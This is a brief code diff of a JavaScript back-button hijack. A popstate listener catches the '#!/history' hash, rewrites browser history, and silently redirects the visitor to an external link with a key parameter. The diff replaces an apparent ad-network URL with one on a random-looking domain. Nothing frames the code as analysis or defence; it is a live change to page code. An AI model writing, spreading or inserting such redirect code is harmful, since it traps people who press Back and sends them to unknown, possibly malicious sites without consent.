@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://www.effectivecpmcontent.com/m2iudzu7tp?key=2874d06402b07858a75d12160cdb5474"); 
+      location.replace("https://forearmdissipatejubilee.com/y0zr19b94g?key=45672489f78c3bc4cba4ebd72c956f2e"); 
     },10); 
   } 
 }, false); 
